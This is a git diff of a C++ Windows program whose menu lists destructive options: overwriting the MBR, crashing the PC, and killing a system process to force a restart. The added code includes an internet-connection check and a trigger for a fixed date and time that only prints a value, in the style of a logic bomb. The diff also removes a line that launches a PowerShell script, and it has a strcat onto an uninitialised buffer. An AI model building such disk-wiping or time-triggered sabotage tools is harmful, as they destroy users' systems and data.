@@ -5,12 +5,16 @@
 #include <fstream>
 #include <shellapi.h>
 #include <experimental/filesystem>
+#include <WinInet.h>
+
+#pragma comment(lib, "WinInet.lib")
 
 using std::cout;
 using std::endl;
 using std::cin;
 using std::string;
 using std::ofstream;
+using std::fstream;
 
 #define MBR_SIZE 512
 
@@ -42,7 +46,7 @@ int main() {
 		cout << "2 - Overwrites MBR\n";
 		cout << "3 - Might crash your PC\n";
 		cout << "4 - Forces PC to restart by killing system process\n";
-		cout << "5 - Causes system to reboot with a BSOD\n";
+		cout << "5 - ...\n";
 	}
 
 	if (c == 1) {
@@ -80,7 +84,24 @@ int main() {
 	}
 
 	if (c == 5) {
-		system("start powershell.exe .\test.ps1");
+		SYSTEMTIME st, lt;
+
+		GetSystemTime(&st);
+		GetLocalTime(&lt);
+
+		char url[128];
+		strcat(url, "https://google.com");
+		bool isConnected = InternetCheckConnection(url, FLAG_ICC_FORCE_CONNECTION, 0);
+
+		if (isConnected) {
+			if (st.wYear == 2022 && st.wMonth == 12 && st.wDay == 6 && lt.wHour == 13 && lt.wMinute == 50) {
+				cout << 1;
+			}
+		}
+
+		else {
+			cout << "No internet connection\n";
+		}
 	}
 	system("pause");
 }
